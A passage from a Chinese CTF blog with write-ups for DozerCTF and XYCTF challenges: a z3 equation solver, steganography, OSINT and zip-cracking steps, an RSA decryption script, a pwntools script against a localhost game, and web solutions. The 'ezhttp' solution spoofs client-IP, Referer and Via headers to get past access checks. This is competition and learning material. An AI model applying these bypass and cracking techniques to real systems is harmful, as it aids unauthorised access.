class="hljs-number">13</span>] * <span class="hljs-number">2</span> == <span class="hljs-number">1129</span>,<br>(((((nums[<span class="hljs-number">0</span>] * <span class="hljs-number">5</span> - nums[<span class="hljs-number">1</span>] - <span class="hljs-number">2</span>) + nums[<span class="hljs-number">2</span>] - <span class="hljs-number">2</span>) + nums[<span class="hljs-number">3</span>] + <span class="hljs-number">5</span> - nums[<span class="hljs-number">4</span>]) + <span class="hljs-number">3</span> + nums[<span class="hljs-number">5</span>] * <span class="hljs-number">2</span> + nums[<span class="hljs-number">6</span>] + <span class="hljs-number">2</span> - nums[<span class="hljs-number">7</span>] * <span class="hljs-number">4</span> - nums[<span class="hljs-number">8</span>] - <span class="hljs-number">2</span>) + nums[<span class="hljs-number">9</span>] + <span class="hljs-number">5</span> + nums[<span class="hljs-number">10</span>] + <span class="hljs-number">4</span> - nums[<span class="hljs-number">11</span>]) + <span class="hljs-number">3</span> + nums[<span class="hljs-number">12</span>] + <span class="hljs-number">3</span> - nums[<span class="hljs-number">13</span>] * <span class="hljs-number">5</span> == <span class="hljs-number">55</span>,<br>((((nums[<span class="hljs-number">0</span>] + <span class="hljs-number">2</span> - nums[<span class="hljs-number">1</span>] * <span class="hljs-number">4</span> - nums[<span class="hljs-number">2</span>] * <span class="hljs-number">3</span>) + nums[<span class="hljs-number">3</span>] + <span class="hljs-number">3</span> + nums[<span class="hljs-number">4</span>] * <span class="hljs-number">4</span> + nums[<span class="hljs-number">5</span>] * <span class="hljs-number">3</span> - nums[<span class="hljs-number">6</span>]) + <span class="hljs-number">5</span> + nums[<span class="hljs-number">7</span>] - <span class="hljs-number">2</span> - nums[<span class="hljs-number">8</span>]) + <span class="hljs-number">5</span> + nums[<span class="hljs-number">9</span>] * <span class="hljs-number">4</span> - nums[<span class="hljs-number">10</span>] - <span class="hljs-number">2</span> - nums[<span class="hljs-number">11</span>] - <span class="hljs-number">4</span>) + nums[<span class="hljs-number">12</span>] * <span class="hljs-number">5</span> - nums[<span class="hljs-number">13</span>] - <span class="hljs-number">4</span> == <span class="hljs-number">673</span>,<br>(((((nums[<span class="hljs-number">0</span>] - <span class="hljs-number">5</span> - nums[<span class="hljs-number">1</span>] - <span class="hljs-number">4</span> - nums[<span class="hljs-number">2</span>] - <span class="hljs-number">4</span> - nums[<span class="hljs-number">3</span>]) + <span class="hljs-number">2</span> + nums[<span class="hljs-number">4</span>] * <span class="hljs-number">4</span> - nums[<span class="hljs-number">5</span>]) + <span class="hljs-number">4</span> + nums[<span class="hljs-number">6</span>] + <span class="hljs-number">3</span> + nums[<span class="hljs-number">7</span>] + <span class="hljs-number">5</span> - nums[<span class="hljs-number">8</span>] * <span class="hljs-number">5</span> - nums[<span class="hljs-number">9</span>]) + <span class="hljs-number">2</span> + nums[<span class="hljs-number">10</span>] + <span class="hljs-number">2</span> + nums[<span class="hljs-number">11</span>] - <span class="hljs-number">2</span>) + nums[<span class="hljs-number">12</span>] * <span class="hljs-number">3</span> - nums[<span class="hljs-number">13</span>]) + <span class="hljs-number">4</span> == <span class="hljs-number">249</span>,<br>((((((nums[<span class="hljs-number">0</span>] * <span class="hljs-number">4</span> + nums[<span class="hljs-number">1</span>] - <span class="hljs-number">4</span>) + nums[<span class="hljs-number">2</span>] - <span class="hljs-number">5</span>) + nums[<span class="hljs-number">3</span>] - <span class="hljs-number">2</span> - nums[<span class="hljs-number">4</span>] * <span class="hljs-number">2</span>) + nums[<span class="hljs-number">5</span>] + <span class="hljs-number">3</span> + nums[<span class="hljs-number">6</span>] - <span class="hljs-number">3</span> - nums[<span class="hljs-number">7</span>]) + <span class="hljs-number">3</span> - nums[<span class="hljs-number">8</span>] * <span class="hljs-number">4</span> - nums[<span class="hljs-number">9</span>] * <span class="hljs-number">3</span>) + nums[<span class="hljs-number">10</span>] * <span class="hljs-number">2</span> + nums[<span class="hljs-number">11</span>] * <span class="hljs-number">5</span> + nums[<span class="hljs-number">12</span>] - <span class="hljs-number">4</span>) + nums[<span class="hljs-number">13</span>] - <span class="hljs-number">4</span> == <span class="hljs-number">422</span>,<br>((((((nums[<span class="hljs-number">0</span>] * <span class="hljs-number">3</span> - nums[<span class="hljs-number">1</span>] - <span class="hljs-number">3</span> - nums[<span class="hljs-number">2</span>] - <span class="hljs-number">3</span>) + nums[<span class="hljs-number">3</span>] - <span class="hljs-number">2</span> - nums[<span class="hljs-number">4</span>] - <span class="hljs-number">5</span>) + nums[<span class="hljs-number">5</span>] * <span class="hljs-number">2</span> + nums[<span class="hljs-number">6</span>] - <span class="hljs-number">4</span>) + nums[<span class="hljs-number">7</span>] - <span class="hljs-number">5</span>) + nums[<span class="hljs-number">8</span>] * <span class="hljs-number">5</span> - nums[<span class="hljs-number">9</span>] * <span class="hljs-number">3</span> - nums[<span class="hljs-number">10</span>]) + <span class="hljs-number">5</span> - nums[<span class="hljs-number">11</span>] - <span class="hljs-number">4</span> - nums[<span class="hljs-number">12</span>] * <span class="hljs-number">5</span>) + nums[<span class="hljs-number">13</span>] - <span class="hljs-number">4</span> == <span class="hljs-number">49</span>,<br>(((((((nums[<span class="hljs-number">0</span>] - <span class="hljs-number">4</span> - nums[<span class="hljs-number">1</span>]) + <span class="hljs-number">3</span> - nums[<span class="hljs-number">2</span>]) + <span class="hljs-number">4</span> - nums[<span class="hljs-number">3</span>] - <span class="hljs-number">4</span>) + nums[<span class="hljs-number">4</span>] + <span class="hljs-number">5</span> - nums[<span class="hljs-number">5</span>] * <span class="hljs-number">3</span>) + nums[<span class="hljs-number">6</span>] + <span class="hljs-number">2</span> + nums[<span class="hljs-number">7</span>] * <span class="hljs-number">4</span> - nums[<span class="hljs-number">8</span>] - <span class="hljs-number">4</span> - nums[<span class="hljs-number">9</span>]) + <span class="hljs-number">3</span> - nums[<span class="hljs-number">10</span>] * <span class="hljs-number">5</span>) + nums[<span class="hljs-number">11</span>] * <span class="hljs-number">2</span> + nums[<span class="hljs-number">12</span>] * <span class="hljs-number">3</span> - nums[<span class="hljs-number">13</span>]) + <span class="hljs-number">2</span> == <span class="hljs-number">0</span>,<br>(((((((nums[<span class="hljs-number">0</span>] - <span class="hljs-number">5</span> - nums[<span class="hljs-number">1</span>]) + <span class="hljs-number">5</span> - nums[<span class="hljs-number">2</span>] - <span class="hljs-number">4</span>) + nums[<span class="hljs-number">3</span>] + <span class="hljs-number">3</span> + nums[<span class="hljs-number">4</span>] - <span class="hljs-number">2</span>) + nums[<span class="hljs-number">5</span>] - <span class="hljs-number">4</span>) + nums[<span class="hljs-number">6</span>] * <span class="hljs-number">2</span> - nums[<span class="hljs-number">7</span>] - <span class="hljs-number">4</span> - nums[<span class="hljs-number">8</span>] * <span class="hljs-number">4</span>) + nums[<span class="hljs-number">9</span>] + <span class="hljs-number">4</span> + nums[<span class="hljs-number">10</span>] * <span class="hljs-number">4</span> - nums[<span class="hljs-number">11</span>]) + <span class="hljs-number">5</span> - nums[<span class="hljs-number">12</span>]) + <span class="hljs-number">4</span> + nums[<span class="hljs-number">13</span>] + <span class="hljs-number">4</span> == <span class="hljs-number">268</span>,<br>((((((nums[<span class="hljs-number">0</span>] - <span class="hljs-number">5</span> - nums[<span class="hljs-number">1</span>]) + <span class="hljs-number">3</span> - nums[<span class="hljs-number">2</span>]) + <span class="hljs-number">2</span> + nums[<span class="hljs-number">3</span>] - <span class="hljs-number">4</span> - nums[<span class="hljs-number">4</span>]) + <span class="hljs-number">4</span> + nums[<span class="hljs-number">5</span>] - <span class="hljs-number">5</span> - nums[<span class="hljs-number">6</span>]) + <span class="hljs-number">2</span> + nums[<span class="hljs-number">7</span>] - <span class="hljs-number">4</span> - nums[<span class="hljs-number">8</span>] - <span class="hljs-number">5</span> - nums[<span class="hljs-number">9</span>] - <span class="hljs-number">5</span> - nums[<span class="hljs-number">10</span>] - <span class="hljs-number">2</span> - nums[<span class="hljs-number">11</span>]) + <span class="hljs-number">5</span> + nums[<span class="hljs-number">12</span>] - <span class="hljs-number">3</span>) + nums[<span class="hljs-number">13</span>] + <span class="hljs-number">4</span> == -<span class="hljs-number">162</span>,<br>((((((((nums[<span class="hljs-number">0</span>] + <span class="hljs-number">5</span> - nums[<span class="hljs-number">1</span>]) + <span class="hljs-number">4</span> + nums[<span class="hljs-number">2</span>] * <span class="hljs-number">5</span> - nums[<span class="hljs-number">3</span>] - <span class="hljs-number">3</span>) + nums[<span class="hljs-number">4</span>] - <span class="hljs-number">5</span> - nums[<span class="hljs-number">5</span>] - <span class="hljs-number">5</span>) + nums[<span class="hljs-number">6</span>] + <span class="hljs-number">3</span> - nums[<span class="hljs-number">7</span>] * <span class="hljs-number">5</span> - nums[<span class="hljs-number">8</span>] * <span class="hljs-number">3</span>) + nums[<span class="hljs-number">9</span>] - <span class="hljs-number">4</span>) + nums[<span class="hljs-number">10</span>] - <span class="hljs-number">2</span>) + nums[<span class="hljs-number">11</span>] - <span class="hljs-number">3</span>) + nums[<span class="hljs-number">12</span>] - <span class="hljs-number">5</span>) + nums[<span class="hljs-number">13</span>] + <span class="hljs-number">2</span> == -<span class="hljs-number">2</span>,<br>((((nums[<span class="hljs-number">0</span>] + <span class="hljs-number">4</span> + nums[<span class="hljs-number">1</span>] - <span class="hljs-number">5</span> - nums[<span class="hljs-number">2</span>]) + <span class="hljs-number">3</span> + nums[<span class="hljs-number">3</span>] + <span class="hljs-number">3</span> - nums[<span class="hljs-number">4</span>] - <span class="hljs-number">4</span> - nums[<span class="hljs-number">5</span>]) + <span class="hljs-number">3</span> + nums[<span class="hljs-number">6</span>] - <span class="hljs-number">3</span> - nums[<span class="hljs-number">7</span>] - <span class="hljs-number">5</span> - nums[<span class="hljs-number">8</span>]) + <span class="hljs-number">3</span> + nums[<span class="hljs-number">9</span>] - <span class="hljs-number">5</span> - nums[<span class="hljs-number">10</span>] - <span class="hljs-number">2</span>) + nums[<span class="hljs-number">11</span>] + <span class="hljs-number">5</span> + nums[<span class="hljs-number">12</span>] * <span class="hljs-number">5</span> - nums[<span class="hljs-number">13</span>] - <span class="hljs-number">5</span> == <span class="hljs-number">433</span>,<br>(((((nums[<span class="hljs-number">0</span>] + <span class="hljs-number">4</span> + nums[<span class="hljs-number">1</span>] + <span class="hljs-number">4</span> + nums[<span class="hljs-number">2</span>] + <span class="hljs-number">3</span> - nums[<span class="hljs-number">3</span>] - <span class="hljs-number">2</span>) + nums[<span class="hljs-number">4</span>] - <span class="hljs-number">4</span>) + nums[<span class="hljs-number">5</span>] + <span class="hljs-number">3</span> - nums[<span class="hljs-number">6</span>] - <span class="hljs-number">4</span> - nums[<span class="hljs-number">7</span>] * <span class="hljs-number">2</span>) + nums[<span class="hljs-number">8</span>] - <span class="hljs-number">3</span>) + nums[<span class="hljs-number">9</span>] + <span class="hljs-number">2</span> + nums[<span class="hljs-number">10</span>] * <span class="hljs-number">3</span> - nums[<span class="hljs-number">11</span>] * <span class="hljs-number">4</span>) + nums[<span class="hljs-number">12</span>] + <span class="hljs-number">5</span> + nums[<span class="hljs-number">13</span>] * <span class="hljs-number">3</span> == <span class="hljs-number">515</span>,<br>]  <br>  <br><span class="hljs-comment"># 创建一个求解器对象  </span><br>s = Solver()  <br>  <br><span class="hljs-comment"># 将方程添加到求解器中  </span><br>s.add(eqns)  <br>  <br><span class="hljs-comment"># 检查是否有解  </span><br><span class="hljs-keyword">if</span> s.check() == sat:  <br>    <span class="hljs-comment"># 获取解  </span><br>    m = s.model()  <br>    <span class="hljs-comment"># 打印解  </span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">14</span>):  <br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;nums<span class="hljs-subst">&#123;i&#125;</span> = <span class="hljs-subst">&#123;m[nums[i]]&#125;</span>&quot;</span>)  <br><span class="hljs-keyword">else</span>:  <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;方程组无解&quot;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">14</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>(m[nums[i]]))),end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br><span class="hljs-comment">#B@by_5yth0n&amp;z3</span><br><span class="hljs-comment">#Dozerctf&#123;&#125;</span><br></code></pre></td></tr></table></figure><h2 id="我是尊者"><a href="#我是尊者" class="headerlink" title="我是尊者"></a>我是尊者</h2><p>看到wp挺离谱，这么简单</p><p><img src="/../../images/dozerctf2024/%E5%B0%8A%E8%80%85.png" alt="尊者"></p><p>Dozerctf{31de43b1a1fb565dabfa9ad8320f11de}</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XYCTFwp及个人复盘</title>
    <link href="/2024/04/26/XYCTFwp%E5%8F%8A%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%9B%98/"/>
    <url>/2024/04/26/XYCTFwp%E5%8F%8A%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%9B%98/</url>
    
    <content type="html"><![CDATA[<hr><p>前言:写一写做出来的题目，和对web不会题目的复盘。是菜狗写的差轻喷。</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>没难度吧，题目还没看到就被队友解决了。扫一下码就行了。</p><h2 id="熊博士"><a href="#熊博士" class="headerlink" title="熊博士"></a>熊博士</h2><p>下载，发现图片和一段类似flag的文字。对应xyctf，想到应该是古典密码埃特巴什码，找个网站一把梭就行。</p><p><img src="/../images/xyctf/%E7%86%8A%E5%8D%9A%E5%A3%AB.png" alt="熊博士"></p><h2 id="ez-隐写"><a href="#ez-隐写" class="headerlink" title="ez_隐写"></a>ez_隐写</h2><p>最外层是队友打开的，用的是360的解压，不明白原理，我也打不开。</p><p>打开之后里面的用软件跑一下密码是20240401(开赛日)，压缩包名字是watermark。</p><p>猜测应该是盲水印。</p><p><img src="/../images/xyctf/%E9%9A%90%E5%86%99.BMP" alt="隐写"></p><p>在网上锐化一下还是能看出来的。</p><p>XYCTF{159-WSX-IJN-852}</p><h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><p>看一下是一个图片.<img src="/../images/xyctf/game.jpg" alt="game"></p><p>一脸懵，一开始以为是什么特殊加密，用Google搜图发现是一个游戏。得到答案。</p><p><img src="/../images/xyctf/game1.png" alt="game1"></p><h2 id><a href="#" class="headerlink" title></a></h2><h2 id="zzl的护理小课堂"><a href="#zzl的护理小课堂" class="headerlink" title="zzl的护理小课堂"></a>zzl的护理小课堂</h2><p>一开始以为就是搜题目解答我还特地都写了，结果写到100还是不给(真傻啊)。直接看源码，搜索alert,没出，那就score，搜到关键。<img src="/../images/xyctf/zzl1.png" alt="zzl1"></p><p>那就很简单了，打个断点然后score&#x3D;101就行，注意flag是动态的。<img src="/../images/xyctf/zzl2.png" alt="zzl2"></p><h2 id="zip神之套"><a href="#zip神之套" class="headerlink" title="zip神之套"></a>zip神之套</h2><p>解压，猜不出来看看exe,这里需要用ida打开(什么居然考re,还好入了个门)。ida64打开，<img src="/../images/xyctf/zip.png" alt="zip"></p><p>里面是八位，继续盲猜开赛日，20240401，套在里面果然打开了。</p><p>继续打开，能直接打开里面的一个，估计flag是在另外一个zip里面，估计是明文攻击直接用ARPCH明文攻击，这样就能打开了（太懒了不放图了</p><h2 id="真-签到"><a href="#真-签到" class="headerlink" title="真&gt;签到"></a>真&gt;签到</h2><p>用软件跑一下密码654321.打开发现啥也没有，用010打开zip,发现开头有flag。</p><h2 id="EZ-Base1024-2"><a href="#EZ-Base1024-2" class="headerlink" title="EZ_Base1024*2"></a>EZ_Base1024*2</h2><p>下载文件用软件跑一下出答案，用base2048<img src="/../images/xyctf/base2048.png" alt="base2048"></p><h2 id="Osint1"><a href="#Osint1" class="headerlink" title="Osint1"></a>Osint1</h2><p>这是社工题，还挺好玩的，先用百度识图看一下。找到这篇文章。<a href="https://club.m.autohome.com.cn/bbs/threadowner/0f96f216d67eb3dc/97798149-1.html">链接</a>，确定了是在江苏省南通市，搜一下旁边是什么海，是黄海，那就差一条路了。然后我自己跑到google上面看看有没有实景的，再结合图片发现应该是在那个园区附近，还有大风车。(这里用的腾讯地图发现的，其他的都看不清<img src="/../images/xyctf/osint1.png" alt="osint1"></p><p>看着像估计就是这里了，把可能的结果都试一下，发现是滨海东路。</p><h2 id="Osint2"><a href="#Osint2" class="headerlink" title="Osint2"></a>Osint2</h2><p>图片给的是高铁站的图片给的提示是已经玩结束要回去了，在12306搜索一下车次每天只有一班g3293，龙门是在河南省，靠近这个高铁站的就只有几个景点，最后试出来是老君山(我还没爬过,悲伤.jpg)</p><h2 id="Ez-osint"><a href="#Ez-osint" class="headerlink" title="Ez_osint"></a>Ez_osint</h2><p>图片下载直接整破防了，试了几种常规的png隐写没找出来，用stegsolve发现了一个水印网址 <a href="https://www.hi2future.com/">链接</a>，一开始找到的是假flag,观察图片上面的时间直接去找原来的那封信，发现留言有flag(别样的社工题)。</p><h2 id="出题有点烦"><a href="#出题有点烦" class="headerlink" title="出题有点烦"></a>出题有点烦</h2><p>下载文件解压，用软件跑一遍是123456，解压，看到前面三个都不能正常看，用010打开，把开头重新编辑，正常可以看了，第一个图片是假的flag。试了一会之后发现用foremost第五个图像可以分离一个压缩包，提出来用软件跑一遍，密码是xyctf，打开里面是正确的flag.</p><h2 id="美妙的歌声"><a href="#美妙的歌声" class="headerlink" title="美妙的歌声"></a>美妙的歌声</h2><p>下载是wav音频，用Audacity打开，打开多视图发现频谱图好像有点东西，微调一会发现是有东西的</p><p><img src="/../images/xyctf/%E9%9F%B3%E9%A2%91.png" alt="音频"></p><p>这大概率不是直接的flag,应该是key,用deepsound打开，解密分离得到flag.txt，里面有flag,</p><p>XYCTF{T0uch_y0ur_he3rt_d55ply!!}</p><h2 id="Rosk-Paper-Scissors"><a href="#Rosk-Paper-Scissors" class="headerlink" title="Rosk,Paper,Scissors!"></a>Rosk,Paper,Scissors!</h2><p>也是受高人指点，可以进行手搓，一个一个试，只有开头的会随机变，脚本多跑几遍就行了。上代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">57882</span>)<br>a=[<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    p.recvuntil(<span class="hljs-string">&quot;&quot;</span>)<br>    p.sendline(i)<br>p.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="以下为复现（彩蛋"><a href="#以下为复现（彩蛋" class="headerlink" title="以下为复现（彩蛋"></a>以下为复现（彩蛋</h2><p>首先第一段应该是一个八进制转字符串</p><p><img src="/../images/xyctf/%E5%BD%A9%E8%9B%8B1.png"></p><p>然后第三段应该是二进制转字符串<img src="/../images/xyctf/%E5%BD%A9%E8%9B%8B2.png" alt="彩蛋2"></p><p>第二段说不需要扫描器，参考了其他师傅的wp，是下载图片转png图片，<a href="https://convertio.co/zh/">转化</a>，然后用zsteg得到<img src="/../images/xyctf/%E5%BD%A9%E8%9B%8B3.png" alt="彩蛋3"></p><p>审视了一下应该是键盘密码，<a href="http://wbic16.xedoloh.com/dvorak.html">键盘密码</a></p><p><img src="/../images/xyctf/%E5%BD%A9%E8%9B%8B4.png" alt="彩蛋4"></p><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h3 id="happy-to-solve1"><a href="#happy-to-solve1" class="headerlink" title="happy_to_solve1"></a>happy_to_solve1</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">import</span> gmpy2<br><span class="hljs-attribute">from</span> Crypto.Util.number import *<br><br><br><span class="hljs-attribute">n</span> =  <span class="hljs-number">24852206647750545040640868093921252282805229864862413863025873203291042799096787789288461426555716785288286492530194901130042940279109598071958012303179823645151637759103558737126271435636657767272703908384802528366090871653024192321398785017073393201385586868836278447340624427705360349350604325533927890879</span><br><span class="hljs-attribute">c</span> =  <span class="hljs-number">14767985399473111932544176852718061186100743117407141435994374261886396781040934632110608219482140465671269958180849886097491653105939368395716596413352563005027867546585191103214650790884720729601171517615620202183534021987618146862260558624458833387692782722514796407503120297235224234298891794056695442287</span><br><span class="hljs-attribute">e</span> = <span class="hljs-number">65537</span><br><span class="hljs-attribute">t</span> = <span class="hljs-number">1</span><br><span class="hljs-comment"># 因为q是p的取反后取比其值大的最近的一个素数，所以p + q = 2**512 - 1 + t</span><br><span class="hljs-attribute">for</span> i in range(<span class="hljs-number">300</span>):<br>    <span class="hljs-attribute">phi</span> = n - (<span class="hljs-number">2</span>**<span class="hljs-number">512</span> - <span class="hljs-number">1</span> + t) + <span class="hljs-number">1</span><br>    <span class="hljs-attribute">d</span> = gmpy2.invert(e, phi)<br>    <span class="hljs-attribute">m</span> = pow(c, d, n)<br>    <span class="hljs-attribute">print</span>(long_to_bytes(m))<br>    <span class="hljs-attribute">t</span> += <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><p>这部分就是闹着玩随便写写，我不会re就看看题目。所有也懒得放图了。</p><h2 id="聪明的信使"><a href="#聪明的信使" class="headerlink" title="聪明的信使"></a>聪明的信使</h2><p>这个用ida打开，然后空格一下就能看到明显类似flag的一段内容。</p><p>我记得好像是栅栏密码，网上一把梭就行了，没什么难度。</p><h2 id="你是真的大学生吗？"><a href="#你是真的大学生吗？" class="headerlink" title="你是真的大学生吗？"></a>你是真的大学生吗？</h2><p>这题有一丢丢借鉴别人，但是问题不大。同样也是用ida打开就行，找到关键内容就行，也是懒不想看了，（我又不是re手，直接上代码和答案。<img src="/../images/xyctf/%E5%A4%A7%E5%AD%A6%E7%94%9F.png" alt="大学生"></p><p><img src="/../images/xyctf/%E5%A4%A7%E5%AD%A6%E7%94%9F1.png" alt="大学生1">差不多吧，嘿嘿。</p><h2 id="DebugMe"><a href="#DebugMe" class="headerlink" title="DebugMe"></a>DebugMe</h2><p>这题其实我感觉挺简单的，具体操作不会，下载一个安卓模拟器，然后用jeb调debugger就行，就能出答案了，but 我不会，sorry啦。</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><p>web真是心碎啊，发现自己不会的还是太多太多了，会把所有没写出来的也顺带复盘一下。</p><h2 id="ezhttp"><a href="#ezhttp" class="headerlink" title="ezhttp"></a>ezhttp</h2><p>diserach扫一下有flag.php和robots.txt,里面有账户和密码。</p><p>跟着要求在bp里面改就行了，考察一下头，wp如下。</p><p>User-Agent: XYCTF</p><p>client-Ip:127.0.0.1</p><p>via:ymzx.qq.com</p><p>Referer:yuanshen.com</p><p>Cookie:XYCTF</p><h2 id="warm-up"><a href="#warm-up" class="headerlink" title="warm up"></a>warm up</h2><p>先上源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;next.php&#x27;</span>;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span 